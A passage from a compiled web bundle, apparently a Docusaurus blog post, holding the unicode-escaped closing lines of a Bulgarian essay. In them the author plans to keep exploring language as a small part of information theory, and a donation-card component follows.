\u043f\u0438\u0441\u0430\u043d\u0435\u0442\u043e \u043d\u0430 \u0442\u0435\u0437\u0438 \u043d\u044f\u043a\u043e\u043b\u043a\u043e \u0440\u0435\u0434\u0430 \u043f\u043e \u0432\u044a\u043f\u0440\u043e\u0441\u0430. \u041d\u0430\u043c\u0438\u0440\u0430\u043c \u0437\u0430 \u0434\u043e\u0441\u0442\u0430 \u0432\u0435\u0440\u043e\u044f\u0442\u043d\u043e \u0434\u0430 \u043f\u0440\u043e\u0434\u044a\u043b\u0436\u0430 \u0434\u0430 \u0440\u0430\u0437\u0443\u0447\u0430\u0432\u0430\u043c \u043a\u0430\u043a\u0432\u0438 \u0438\u043d\u0442\u0435\u0440\u0435\u0441\u043d\u0438 \u043d\u0435\u0449\u0430 \u0441\u0435 \u043a\u0440\u0438\u044f\u0442 \u0432 \u0442\u043e\u0437\u0438 \u0440\u0435\u0434 \u043d\u0430 \u043c\u0438\u0441\u043b\u0438, \u043e\u0433\u043b\u0435\u0436\u0434\u0430\u0439\u043a\u0438 \u0435\u0437\u0438\u043a\u0430 \u043a\u0430\u0442\u043e \u043c\u0430\u043b\u043a\u0430 \u0447\u0430\u0441\u0442 \u043e\u0442 \u0438\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u0430\u0442\u0430 \u0442\u0435\u043e\u0440\u0438\u044f.\\n\\nimport DonateCard from \'@site/src/components/DonateCard\';\\n\\n<DonateCard/>"}]}')}}]);